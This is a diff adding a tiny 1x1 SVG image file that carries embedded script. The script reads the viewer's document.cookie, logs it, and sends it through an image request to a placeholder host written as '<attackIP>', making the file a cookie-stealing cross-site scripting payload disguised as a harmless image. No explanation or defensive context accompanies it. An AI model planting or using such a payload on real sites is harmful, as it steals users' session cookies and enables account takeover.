@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/ecmascript">
+        <![CDATA[
+        console.log("Before request: ", document.cookie);
+        new Image().src = 'http://<attackIP>/index.php?c=' + document.cookie;
+        console.log("After request");
+        ]]>
+    </script>
+</svg>
